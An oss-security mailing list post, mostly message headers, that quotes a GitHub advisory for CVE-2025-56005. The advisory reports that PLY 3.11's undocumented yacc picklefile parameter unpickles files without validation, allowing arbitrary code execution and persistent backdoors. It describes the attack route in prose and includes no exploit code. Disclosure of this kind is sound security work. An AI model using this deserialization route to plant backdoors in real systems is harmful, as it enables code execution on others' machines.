Received: (qmail 24151 invoked by uid 550); 23 Jan 2026 19:06:42 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 24076 invoked from network); 23 Jan 2026 19:06:41 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=oracle.com; h=
	content-transfer-encoding:content-type:date:from:message-id
	:mime-version:subject:to; s=corp-2025-04-25; bh=ixcQyXFfBvvHr1Zl
	j/OaNQ1Ke76tc4VLe4YIlPuOuX8=; b=muAPJU1aDrlSZJkQURZns+6i3SJE1Np9
	S3BI2GlMsK8MPFy8s86AtGhNa6sbZU+C9U+D1xOmpHr5ry0xJ66z4Bov368OAlRZ
	saW1axh3WKRX77HOQKIkzEUmbvTWf7dXRUTz5Gwb7JOV5YeGaupn0aXBKsVZASEa
	FioPMu+moyTZ3qBIGErsmnuCN8x7EqpwrNkaZg+Mctv61q4s7lCHz1BU7wMMRMmI
	YmqN9DaFcYEHsxw/stIQ02h32xF/5GL590+bkr+Es769O4mrz6ytKh4ZEOv5AMUV
	4q3hD28erKROEM7nRmetdJpe+EezyMLdQO91M+Cez1y9Ils4NTiREw==
ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=i3bsqe33sE7faPOHE9fidtUMx3/IZr/915dR1b83KJ0wHbdPvgqhU230ElRW45cDfCSTRDhgZDUX894Y6gouJqe1kP9cgEdd2zXa0XQpz5bGk31hYBIUk9lu1XE9Y9cUwyFWxfTTob6wcJ3hhsVYhi3RBIHWvhqUp7lmv6fBPfboZnZCjbey2iauVi3MCLHM8vSmGHFTKcliuGDeuK4S/itbaV9H3vu93O90sOpuaaRxUa+pFiSLuhjeXP349+WNVGIJ8MpWetMMyof94EP0X3hLaMqD4J0PdiLJA/rucfqZH+zJ+sVYVgoSnN4GYMTXXF8bn51CduEWsi6yyvu96w==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=ixcQyXFfBvvHr1Zlj/OaNQ1Ke76tc4VLe4YIlPuOuX8=;
 b=abAx6SnVsKyJQlQxB5su7AnPa0dA2wf7Jsr1XmN7NnM8SpsoWZN4I88clg4aznv8WVP4UwHIK7ujFkQtLPFv2Rchwv40Jt85bKAniz5FBeFEzqS8YBoArqtRw9qWtuM9Wl5zUN/yzkksWr1WM0wB7ks1jLuOBw4tvaicr7go9dZLkbJsfpwqw6iuNlkxU33eEN9gIvV99kjccQ2GCWr3F0a8bCKgjryLAClEffV/5HQ9ANj7mytalFgJ2Ll+ZdLuiBtrXIzRvmZpjtky+GPstdV9PhRsfme4aqvls0buw/hjYLZzXXfdDmOQeusPFiD/O9O7QjDil8WjsqlO/HU9zg==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=oracle.com; dmarc=pass action=none header.from=oracle.com;
 dkim=pass header.d=oracle.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=oracle.onmicrosoft.com; s=selector2-oracle-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=ixcQyXFfBvvHr1Zlj/OaNQ1Ke76tc4VLe4YIlPuOuX8=;
 b=dpxdeI9GxMAx+Ow2QBO0Es9VR2VKfgQI7ACkJ05OV/KZdsCavCtn469iPcowo/Ufj5L1m1Tv33eOJrDQc2tale2LO9Q3IcRfcqBP9tkVter+6MrhFJIuSG6wXLXV5gjX8vFvDhaAmWTwSTjgyTP8iUyOcuYPs+QsesOkjjq4s6k=
Message-ID: <7d323bf4-91fb-4bee-aed4-e5f3757c3631@oracle.com>
Date: Fri, 23 Jan 2026 11:06:24 -0800
User-Agent: Mozilla Thunderbird
Content-Language: en-US
From: Alan Coopersmith <alan.coopersmith@oracle.com>
To: oss-security@lists.openwall.com
Autocrypt: addr=alan.coopersmith@oracle.com; keydata=
 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
 5V9JclVH6u5Gug==
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit
X-ClientProxiedBy: BYAPR02CA0065.namprd02.prod.outlook.com
 (2603:10b6:a03:54::42) To CH3PR10MB6739.namprd10.prod.outlook.com
 (2603:10b6:610:147::6)
MIME-Version: 1.0
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: CH3PR10MB6739:EE_|DM4PR10MB6278:EE_
X-MS-Office365-Filtering-Correlation-Id: 9936cc0d-d4de-4cba-db00-08de5ab281c5
X-MS-Exchange-SenderADCheck: 1
X-MS-Exchange-AntiSpam-Relay: 0
X-Microsoft-Antispam: BCL:0;ARA:13230040|376014|1800799024|366016|13003099007;
X-Microsoft-Antispam-Message-Info:
	=?utf-8?B?UXFEWGtYVkFlMkpSL1lNL0p0d3hMM3hoQWR1aTkzL0laU3RrVzIvakFHK3VW?=
 =?utf-8?B?ZU9hKzRleWZpWkxrSHBsNGR6cjlxSWFuZloveVh4R2pjeHZjczRESGpBQWRw?=
 =?utf-8?B?bzZ4TTJOOHhNeG5iY1htbTFNT1dNUm0rVnYwRCtmdlVmT3Awd2xMeGU3K1VK?=
 =?utf-8?B?dHppOVM1ZE9zZ0dvZEhSNlpKVnc4RzBZanByd2xZVTl0QjRLOW5aSm4ycHpT?=
 =?utf-8?B?WkxXek1ya0puTi9UK1RoZUNMUGFnMEJTaGJhOWZoVUs2dFFnVFJ1ZHV2UnpN?=
 =?utf-8?B?NFpHczB5Z3FpdWNQMUFvT0VMUW9HUWFvNGNFR3JYT3VnblRyRzJWZUhnZEVi?=
 =?utf-8?B?OEQ4ald0c3JScWl4N21xNlRzczFvZ21yQVpQTmlvYUprUHVBSW9lcTNYS1BB?=
 =?utf-8?B?TFNuR2YzNlh2SkVRL2hnVE5vbVZqN21HQ3h0azV1WGJuMUg1ZE1nZDJxT2hV?=
 =?utf-8?B?NDdnY2FrWU9KZ1h1NWxpeHZXbngzYzRxMWl5T0ppSERoR3ZHRWh2RVd0Y2pS?=
 =?utf-8?B?aVJERnBtN3dPNEIweW9vdHczK1o4OEl4dlBtNi8xU2NUN0J5UWJybXM4YWFQ?=
 =?utf-8?B?TFQzT3Zmc0d5UGNDYzNCZmVQdHJvNjd5VHNDbUlJWVRQT1VFcEYxYk5TU3Nk?=
 =?utf-8?B?bGhVbzg2YXlEN2dVWURleWpvWGx6YTMwNEJkUUVwbjgrVHRyZVJGbHprWEtm?=
 =?utf-8?B?ak40QUdHSERSMHhnVVhlNW9hQUo1YVVBeDhvT1ViamhrbDRFOVlWekF2dC9R?=
 =?utf-8?B?L3ZOczIxMmV4SmYrdmc5dEZkYzZ4N2Z3UGpJMEtVbGdTNVlYeS9qV0lTZ0RD?=
 =?utf-8?B?UXUwS2tBMzNUcnZWanNySHplSUk5Q2k2S1E4a1lOS2MwSDUyUmd0ekNCYTZR?=
 =?utf-8?B?VHUyWXZyYnhGVDgyMWwxYytVMFcyZkh3dUpTdXQwY2NCcUc3dzFWeU5Pc3Ux?=
 =?utf-8?B?NWJBTEdkYTE1cVZuQjlubS9kSkJIVnExd1VqMlg1aG1ZbjlBR1Ivdkd2eFJT?=
 =?utf-8?B?YTZMcDNFaUJEWENJb2xSdTh3Z0dxZHYxTVJhdFlKYUhmcFBwWDZDcFhRNVBC?=
 =?utf-8?B?ZUxqWm5lTnhDMjI2bDNZN2hGc2dqODdpL2V0NGJla05UUWphZkVQRGF2K0lL?=
 =?utf-8?B?Y1dLcllWWTh2Y2d6V0szRnNMRjB3UlpEQmtuZ1JCa3pVU1JvbklUVGpWY0hE?=
 =?utf-8?B?V1Q1cUFxOGt1bmxvdmRMUWMyeWVqRHVqa2NNNDRXYUl4OStaejBXSmxoTjJu?=
 =?utf-8?B?UVhzdEJDaEw1N1p5dldxR0lIWWxOOXY2RE1UY29FcDArbitGajdHUmR1UG1r?=
 =?utf-8?B?bENwT1praXE4VElHUnBiR0FhRU1kcnA5cjhsa2UzcGxaWklFWkxhWDZ5NlF5?=
 =?utf-8?B?bXVWOUNReFhubFYvb2xCa1ZSMDlQTmNYdkVINDZURzhCcm5KRGEyc2lNRTdw?=
 =?utf-8?B?cDFFUU1ybUcwZzlFWDFWUC9odEZqV1JlNkFIOHlYS2VMUEw0djZRZ2hNSGsz?=
 =?utf-8?B?dW4zdTBVYk1JZW5zMGZNY1hJSGNXOVdhMHBuNEpVdXFYT1pkVGlqTysxNGNC?=
 =?utf-8?B?TG1ycTVwQTRJS0VIRHMrY3FoY1llTkxDTXk0emkvdFhuWHZXckRjdk1JUmhM?=
 =?utf-8?B?RDh2SmJtT1RncnpaRSsydGNYY2lZekhHOXR6Y3BzMnY3ZHVjM1A1NmpEcVJy?=
 =?utf-8?B?T2JCREFQYlpyT21GWVdwSWVLODErSEpDRWo1NUJkMlpNT3lCdlMvNWZ2MURs?=
 =?utf-8?B?dWlCcitRL1pldzc4T2QybXUvQjd1aHR6UGcyNkhOK3QxWHNmbTU4TWtQTmtW?=
 =?utf-8?B?WUg2eko5VUlKbGs0ZWdmR1ZNb0RzTE4xZVZNRWQ3dmVFbHF3S2xBNEYyNUR2?=
 =?utf-8?B?dXNUMVRRZ1hQYXF1bzNDSWoxR3hLVEh1T3JtbkxiRS95aldCWnRBaGZiNmVj?=
 =?utf-8?B?bjU1VUhEZlRsanBtTXBJOUgzL1RLaS94Rmxjai9Qem1rNWIrYnNGaytPZDQ0?=
 =?utf-8?B?SmtyME5tZkZvYTRCcDFMQ0p4UDNlRHhTdTI0aUxzQ0tPejNZS3JwanJuYVlN?=
 =?utf-8?B?NVhaOHlSR2xiYzVQQVN1VlhYaVFWNk42SCtXV2k2Z3VIZ25OcXZHYUZPVnVp?=
 =?utf-8?Q?ePPXSLyTUhk2orRPRap7UgKkJ?=
X-Forefront-Antispam-Report:
	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:CH3PR10MB6739.namprd10.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(376014)(1800799024)(366016)(13003099007);DIR:OUT;SFP:1101;
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0:
	=?utf-8?B?MEVCQUsvc0cwS21TaEZwSzBlR011MzFzZDVPekdoSEF0SU1BdzZ1REw4OWJj?=
 =?utf-8?B?c2hWZElMTUdKZDlNRnFNS0lkdzhpaEtMcVNaRWEvb3Z5akNrSDd6ZnhvdHQr?=
 =?utf-8?B?S24wbDVSSktzeHRHdWRYdVdtS2JVcHE4NkNqbktyUXR3VzBrazFjZmh1cHpj?=
 =?utf-8?B?bnA0Z2Y5NWdQcFZROFJ0cFgyUENnWk1rNnZhU0NmV0xBbVpCTUplMTI4a1Q1?=
 =?utf-8?B?Q2RvV20ralkyeDloeUNac1NvNHYyekpuam4wZlVzWEtyamhUVlgzWDJNVkRD?=
 =?utf-8?B?Z2NVUUJsTlJqMUw2YUpDZ25TTkNlSGFTNzdYV0xwcTBYalRTTVBQZ0NEL0hz?=
 =?utf-8?B?bkptSy9ZK0tiR3FhRy90QU9aSlB3bW1iMTYyaUR2eWNIZ3F6K0ovQ3gzbDR2?=
 =?utf-8?B?REltK0pLc0NZclFkM1hBcTJ6UjJpaHJKNTAzazlLN2pYblBEV09FcDNYRjJU?=
 =?utf-8?B?MWp6bXdRdy80NWl5b0xMYWdEeDRJMTZwTWdBdm1kbjNZMlpDdVVFZGZma2FW?=
 =?utf-8?B?WWwxQ2MvZzR0MEJ4anlhQ294R2dTSHlvY0VTMDI0RW9IK0ZtUVBvYzgwUmlN?=
 =?utf-8?B?QXl6bGdPSkxMSGJNbEFKelBMeWlobXgwZGlnMDk3bXlQR09zZnk3Q3cyYlkz?=
 =?utf-8?B?WCtMc2RCWHhhS0tJT24veGEwbENSd2Nxa2tqdmgvUFRETXRRbzBJZXNzWHY0?=
 =?utf-8?B?cFBGd2g3eitYdVhOM2VlSEw2c1FOaUlOd2FjeXhCTEJxcE41Q2pLd0xuWGFR?=
 =?utf-8?B?VGVyZU9hb3NLREJVVGhrMTRLcWlZVHpmTkU5LzJGcGw5K2tqai9McWE4Rkph?=
 =?utf-8?B?NG5rVDVGT21yNEdDVU1qbGRDWWhjdGJHSHB0eW9rbVBsdWplWGkxT0RjWHZk?=
 =?utf-8?B?T01iODV6R3R5NnE0QzhGZEZlcXVOeURSbTZWUHZUZm1MQ3U4TFJiekFNY3VB?=
 =?utf-8?B?Q3d3VG1jVDVWYmh6STRYWGdCanR2WmtZWUo3dHdkdWo5bUh2VWJvcEZsNTJD?=
 =?utf-8?B?RW1sMjkwSmVXUVJqSnF6dnk2R3d0WFZ1RzBGUWRveDJLaDJRTjhGK2NTZGZG?=
 =?utf-8?B?Uld5bkg4NHZUOUV6MHNjT3FNSm1ZRWtDQWpKRWozNm1ZK1FnZzZWdjBwbEhK?=
 =?utf-8?B?bUV1N1VmSjhvNjlwb3NIUHFIdEk5TSsySGF5anlaTHNDODRMcWMwbGZUTmo5?=
 =?utf-8?B?RVozckJJOGdES0hURHplUHA0Qk1lb1NodE1tNTJHbTBhVGNPenA3UXlNT0Qy?=
 =?utf-8?B?YkJJRVBJaW1YNW5pQWtSNFNKYWh0SWhxU1Q5cmpiYjNvcGtvN3RFbGJnRmMv?=
 =?utf-8?B?bllLZkl3ZkJ5UDRzRVlaV3QvQUxJbTRBTXUrMW9rQWFDc2dKUU4rK0tPRHJZ?=
 =?utf-8?B?d0d1cmZaNTJsQ0RCVGdCWnpCTDlUMFU2YkE1OEpWNW15c3Y0bzlHdjFnQXdX?=
 =?utf-8?B?bUt2ZG1aVHc2Wi9rUFk1Q1lpdEJsWGd3UllHaGc5TGg3TUJlMENSckRObnR6?=
 =?utf-8?B?NEpxQ0NhNnVJOUNzZmoxMmc1cmYvQnQ4SVdxTU5pWG0zN3dlMHNDYkFRM0ln?=
 =?utf-8?B?bEVWU0dscHpyR2hxV1pWdStvUDNoZkpRZENxNnBGeEpvQ1VxSFJZSktuWnpE?=
 =?utf-8?B?eGVqRkdGWHZqbXIvQm83blFSR3hjUGJqQTNuUVdhUzdIZTFQN1B0RGpKNVU2?=
 =?utf-8?B?VmNxQ2JFdmdXMllPZ2FFL0Z6WkFMVWMzZE9rcGs1SmpERDQwR0g5YzdZV1Z0?=
 =?utf-8?B?aWpxSU5iVitGRlZaQ3loL24zNS9OVDBEMitDb3NTMjBVZFFRSDNQS2t1VFp3?=
 =?utf-8?B?N2ZMV040cldOYy95Zm45SDc2UERQazRJZFdWS2FHaFlQZ3hVZWZYNFdWSFBX?=
 =?utf-8?B?cFQvWlJLQm1kdDdhejNDT1VqK1V6UXpQYnRjNys3dTRoN2lTeGJZTkZsaFMv?=
 =?utf-8?B?YWl4WGxqeGg5c2JtMEVtM3hmTUR5L0NZaXhMVG9yMjR5RmFpK005aU8yNlN2?=
 =?utf-8?B?SWhlSEVycTArRzdrMDh5TUZZSXdsVG1SSHUvWnFPL0FYV0RUeERoSnd5eFdU?=
 =?utf-8?B?SHJkZUNhQTc4OFVBNXhhWmhtdkswdzJIaVFncWVCTi9ycnhTNHRlTUR3NFRP?=
 =?utf-8?B?Y0k3SVE1WEY2SWxNbVNpVjIvYVRyVmtCVHpVNTlHWjJvTlRndXVqRDlYQjNp?=
 =?utf-8?B?SzI2ZnhjNFJCUTlnWUFBTW9zV2JSMFM1YXYrRkdvQlhZY0FYSSswWFo2dmZk?=
 =?utf-8?B?MmJKMEU0UWt5Qm9lRlRqZHlTK0tBTitCallib1hHV2pCSHA1NHl5MzYxNm1U?=
 =?utf-8?B?a0xHekx2dU1XeUQxUmZoVkZ2M0tZL2pIRlRXbTMxVUlFUXhDMmhleUhJQkJq?=
 =?utf-8?Q?SZcrq9JlAyVB3vTY=3D?=
X-MS-Exchange-AntiSpam-ExternalHop-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-ExternalHop-MessageData-0:
	rHdkZVL7jtwGTYF4SU0I1zFg/WsKLh+Oki8rjmJY6HADItLR9cOXyoGR8rrc5BqNaloVb2UUAHk2UrUazf36vKb9knPxzhxMKGvSKruq/zHX62m2bfiMqxSSXYktiiHiL9eI+uszN0Yqys0BhNYMTJl2eExE572OfidHsxqfMbwnKXSMMnI870AicfmBOGg5GlgCmISS7ujpJ6apYahAvTMfXir9AGr3pL2rdveJuENk/93We1DOA6Q00o225B/B4mmecMxxM6647v0AkUQnMe9m+LLWs/gFc45JLyQy5SabLKHZLa5TL79bSSHdiDtBOCjP0lEf/ZzpVqKC02s/RCcCsR428u6QPDhQgrLYufZ1iMNbcLNN8bCnqAxDPTWYsfLURp1IKmbSv2fu4RnoduUhqcpbb2s3Xbizh/rhjKPgowFgvX9C8jCtuAQarUeHHQ5Mc+mUxQU4qYCsfivJeki/XuIZ+P5YTTvkWoOg9R4rXTvEbp1dro6PQGemA+wHgwoJMy5d0OQqSJWHlHDjRNaYiofacyhe18Yj0o4hUGPz3R4Iqy5Ym5+82xI26nY4sOovqCIKM4PQuAEYXZ0pQ2zXFZwpvcepUA1as1XbDY8=
X-OriginatorOrg: oracle.com
X-MS-Exchange-CrossTenant-Network-Message-Id: 9936cc0d-d4de-4cba-db00-08de5ab281c5
X-MS-Exchange-CrossTenant-AuthSource: CH3PR10MB6739.namprd10.prod.outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 23 Jan 2026 19:06:26.2403
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 4e2c6054-71cb-48f1-bd6c-3a9705aca71b
X-MS-Exchange-CrossTenant-MailboxType: HOSTED
X-MS-Exchange-CrossTenant-UserPrincipalName: rSwKKc/CqGx5kjtapvQkzp5MRYHwOuGOslNQ9XDdj+0mLml9OtGynLRweim+Da5UT7rWqW9fApBEBn//84HntXbJ2Z3VHZRs3wGJjGa3nbA=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: DM4PR10MB6278
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.293,Aquarius:18.0.1121,Hydra:6.1.20,FMLib:17.12.100.49
 definitions=2026-01-23_03,2026-01-22_02,2025-10-01_01
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 mlxlogscore=999 suspectscore=0
 adultscore=0 phishscore=0 spamscore=0 malwarescore=0 bulkscore=0
 mlxscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.12.0-2601150000 definitions=main-2601230145
X-Authority-Analysis: v=2.4 cv=PqqergM3 c=1 sm=1 tr=0 ts=6973c6b7 b=1 cx=c_pps
 a=e1sVV491RgrpLwSTMOnk8w==:117 a=e1sVV491RgrpLwSTMOnk8w==:17
 a=6eWqkTHjU83fiwn7nKZWdM+Sl24=:19 a=z/mQ4Ysz8XfWz/Q5cLBRGdckG28=:19
 a=lCpzRmAYbLLaTzLvsPZ7Mbvzbb8=:19 a=xqWC_Br6kY4A:10 a=IkcTkHD0fZMA:10
 a=vUbySO9Y5rIA:10 a=GoEa3M9JfhUA:10 a=VkNPw1HP01LnGYTKEx00:22
 a=NEAV23lmAAAA:8 a=CckQENj0AAAA:8 a=8AHkEIZyAAAA:8 a=yPCof4ZbAAAA:8
 a=TDNAqSdy4-6qjGaHYwoA:9 a=3ZKOabzyN94A:10 a=QEXdDO2ut3YA:10
 a=MJka_PgyVo4A:10 cc=ntf awl=host:13644
X-Proofpoint-ORIG-GUID: AzVGC36A-OaT8yR50vKelwc2es1Q5qFi
X-Proofpoint-Spam-Details-Enc: AW1haW4tMjYwMTIzMDE0NiBTYWx0ZWRfX82Yjk7VenpXJ
 wTOXruFp6oefhUEIXS2vhCyUSeozjns37VfhtdUeiyXzUQpPOUjPccMGGLLZACpfRI/1iQl/XAT
 RGuZafBh1n193cc34AOqr1HHFY7kJsXMv5B/JDxP9ROJbYiNkvUswiRBVnJpbfE1j7M1GmFDxk3
 0wCESDOrb4ZYWEJIt4kUR+3FifN8DpJIcHwHvWUKK1tS8dJnGljCQhf5O+xE1x0dqXDu6spYvMS
 vmhOMpWfZjsuhGGcXgEu6ed6Zd/JEB+MW1feVvyFDDEMX3C6buQ79fGjx53vr0qdjsHyrEldLCq
 dQUdntrJUm6QQqU/2NZkyD5bQctjRgCvhXeYql3ppbXeeZKrEPSJc3DFs9p2kfoPQCf8O/l72Yf
 M9btpQAvbocIx0nr9a1AAvYomeX5unwGk2iHZ/TsxdqH8B1Uc8Sk++DAgbqzg8pVMy9FqrZs6KQ
 ZlGwO8RvNRcVpbwrGaVlxCiRcWirUErwT9CYNEPE=
X-Proofpoint-GUID: AzVGC36A-OaT8yR50vKelwc2es1Q5qFi
Subject: [oss-security] CVE-2025-56005 Undocumented RCE in PLY via
 `picklefile` Parameter

https://github.com/bohmiiidd/Undocumented-RCE-in-PLY claims:

> Undocumented Remote Code Execution in PLY CVE-2025-56005
> --------------------------------------------------------
> 
> CVE ID: CVE-2025-56005
> Reported by: Ahmed Abd
> Disclosure Date: July 1, 2025
> Affected Product: PLY (Python Lex‑Yacc)
> Affected Version: 3.11 (PyPI distribution)
> Vendor: PLY (Python Lex‑Yacc)
> Affected Component:** ply/yacc.py` — `LRTable.read_pickle()` via `yacc(picklefile=...)`
> 
> ## Summary
> 
> An undocumented and unsafe feature in the PyPI‑distributed version of PLY 3.11
> allows arbitrary code execution when the `yacc()` function is invoked with the
> `picklefile` parameter.
> 
> The `picklefile` parameter causes PLY to deserialize a `.pkl` file using
> Python’s `pickle.load()` **without validation**. Because Python’s `pickle`
> module supports execution of arbitrary code during deserialization (e.g.,
> via `__reduce__()`), an attacker who can control the supplied pickle file
> can execute arbitrary code during parser initialization.
> 
> This parameter is *not documented* in the official PLY documentation or
> GitHub repository, yet it is active in the PyPI release.
> 
> ---
> 
> ## Impact
> 
> attacker can control, replace, or influence the `.pkl` file passed to
> `yacc(picklefile=...)`, they can achieve:
> 
> * Arbitrary code execution
> * Execution during application startup
> * Code execution before any parsing logic is reached
> 
> This may affect applications that load parser tables from:
> 
> * Cached locations
> * Shared directories
> * CI/CD pipelines
> * Configurable or writable paths
> 
> ---
> 
> ## Vulnerability Details
> 
> * **Vulnerability Type:** Arbitrary Code Execution
> * **Attack Type:** Context‑dependent
> * **Attack Vector:** Unsafe deserialization of attacker‑controlled pickle file
> * **Impact:** Code execution
> * **CWE:** CWE‑502 (Deserialization of Untrusted Data)
> 
> ### Affected Functionality
> 
> * `ply.yacc.yacc(picklefile=...)`
> * `LRTable.read_pickle()` in `ply/yacc.py`
> 
> ---
> 
> ## Additional Information (Context & Risk)
> 
> This vulnerability presents elevated risk due to its stealthy nature and
> potential for persistence.
> 
> The `picklefile` parameter is *undocumented* in the official PLY documentation
> and GitHub repository. However, the PyPI‑distributed version of PLY 3.11
> includes this functionality and processes the supplied file using
> `pickle.load()` without validation.
> 
> Because Python’s `pickle` module permits execution of embedded code during
> deserialization, a malicious pickle file can execute arbitrary code *during
> parser setup*, before any parsing logic is invoked.
> 
> At the time of writing, the maintainer has not publicly acknowledged this
> behavior.
> 
> This functionality can be abused to introduce persistent backdoors,
> particularly in environments where parser table files are:
> 
> * Cached on disk
> * Shared between users or services
> * Generated or reused in CI/CD pipelines
